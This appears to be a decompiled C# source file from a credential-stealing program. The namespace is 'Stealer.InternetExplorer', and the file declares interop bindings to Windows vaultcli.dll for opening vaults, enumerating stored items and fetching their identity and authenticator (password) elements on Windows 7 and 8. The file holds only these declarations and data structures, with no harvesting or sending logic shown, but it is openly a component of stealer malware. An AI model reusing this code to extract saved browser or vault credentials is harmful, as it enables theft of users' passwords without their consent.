﻿using System;
using System.Runtime.InteropServices;

namespace Stealer.InternetExplorer
{
	// Token: 0x02000036 RID: 54
	public static class VaultCli
	{
		// Token: 0x060000DF RID: 223
		[DllImport("vaultcli.dll")]
		public static extern int VaultOpenVault(ref Guid vaultGuid, uint offset, ref IntPtr vaultHandle);

		// Token: 0x060000E0 RID: 224
		[DllImport("vaultcli.dll")]
		public static extern int VaultCloseVault(ref IntPtr vaultHandle);

		// Token: 0x060000E1 RID: 225
		[DllImport("vaultcli.dll")]
		public static extern int VaultFree(ref IntPtr vaultHandle);

		// Token: 0x060000E2 RID: 226
		[DllImport("vaultcli.dll")]
		public static extern int VaultEnumerateVaults(int offset, ref int vaultCount, ref IntPtr vaultGuid);

		// Token: 0x060000E3 RID: 227
		[DllImport("vaultcli.dll")]
		public static extern int VaultEnumerateItems(IntPtr vaultHandle, int chunkSize, ref int vaultItemCount, ref IntPtr vaultItem);

		// Token: 0x060000E4 RID: 228
		[DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
		public static extern int VaultGetItem_WIN8(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr pPackageSid, IntPtr zero, int arg6, ref IntPtr passwordVaultPtr);

		// Token: 0x060000E5 RID: 229
		[DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
		public static extern int VaultGetItem_WIN7(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr zero, int arg5, ref IntPtr passwordVaultPtr);

		// Token: 0x02000037 RID: 55
		public enum VAULT_ELEMENT_TYPE
		{
			// Token: 0x0400007E RID: 126
			Undefined = -1,
			// Token: 0x0400007F RID: 127
			Boolean,
			// Token: 0x04000080 RID: 128
			Short,
			// Token: 0x04000081 RID: 129
			UnsignedShort,
			// Token: 0x04000082 RID: 130
			Int,
			// Token: 0x04000083 RID: 131
			UnsignedInt,
			// Token: 0x04000084 RID: 132
			Double,
			// Token: 0x04000085 RID: 133
			Guid,
			// Token: 0x04000086 RID: 134
			String,
			// Token: 0x04000087 RID: 135
			ByteArray,
			// Token: 0x04000088 RID: 136
			TimeStamp,
			// Token: 0x04000089 RID: 137
			ProtectedArray,
			// Token: 0x0400008A RID: 138
			Attribute,
			// Token: 0x0400008B RID: 139
			Sid,
			// Token: 0x0400008C RID: 140
			Last
		}

		// Token: 0x02000038 RID: 56
		public enum VAULT_SCHEMA_ELEMENT_ID
		{
			// Token: 0x0400008E RID: 142
			Illegal,
			// Token: 0x0400008F RID: 143
			Resource,
			// Token: 0x04000090 RID: 144
			Identity,
			// Token: 0x04000091 RID: 145
			Authenticator,
			// Token: 0x04000092 RID: 146
			Tag,
			// Token: 0x04000093 RID: 147
			PackageSid,
			// Token: 0x04000094 RID: 148
			AppStart = 100,
			// Token: 0x04000095 RID: 149
			AppEnd = 10000
		}

		// Token: 0x02000039 RID: 57
		public struct VAULT_ITEM_WIN8
		{
			// Token: 0x04000096 RID: 150
			public Guid SchemaId;

			// Token: 0x04000097 RID: 151
			public IntPtr pszCredentialFriendlyName;

			// Token: 0x04000098 RID: 152
			public IntPtr pResourceElement;

			// Token: 0x04000099 RID: 153
			public IntPtr pIdentityElement;

			// Token: 0x0400009A RID: 154
			public IntPtr pAuthenticatorElement;

			// Token: 0x0400009B RID: 155
			public IntPtr pPackageSid;

			// Token: 0x0400009C RID: 156
			public ulong LastModified;

			// Token: 0x0400009D RID: 157
			public uint dwFlags;

			// Token: 0x0400009E RID: 158
			public uint dwPropertiesCount;

			// Token: 0x0400009F RID: 159
			public IntPtr pPropertyElements;
		}

		// Token: 0x0200003A RID: 58
		public struct VAULT_ITEM_WIN7
		{
			// Token: 0x040000A0 RID: 160
			public Guid SchemaId;

			// Token: 0x040000A1 RID: 161
			public IntPtr pszCredentialFriendlyName;

			// Token: 0x040000A2 RID: 162
			public IntPtr pResourceElement;

			// Token: 0x040000A3 RID: 163
			public IntPtr pIdentityElement;

			// Token: 0x040000A4 RID: 164
			public IntPtr pAuthenticatorElement;

			// Token: 0x040000A5 RID: 165
			public ulong LastModified;

			// Token: 0x040000A6 RID: 166
			public uint dwFlags;

			// Token: 0x040000A7 RID: 167
			public uint dwPropertiesCount;

			// Token: 0x040000A8 RID: 168
			public IntPtr pPropertyElements;
		}

		// Token: 0x0200003B RID: 59
		[StructLayout(LayoutKind.Explicit)]
		public struct VAULT_ITEM_ELEMENT
		{
			// Token: 0x040000A9 RID: 169
			[FieldOffset(0)]
			public VaultCli.VAULT_SCHEMA_ELEMENT_ID SchemaElementId;

			// Token: 0x040000AA RID: 170
			[FieldOffset(8)]
			public VaultCli.VAULT_ELEMENT_TYPE Type;
		}
	}
}
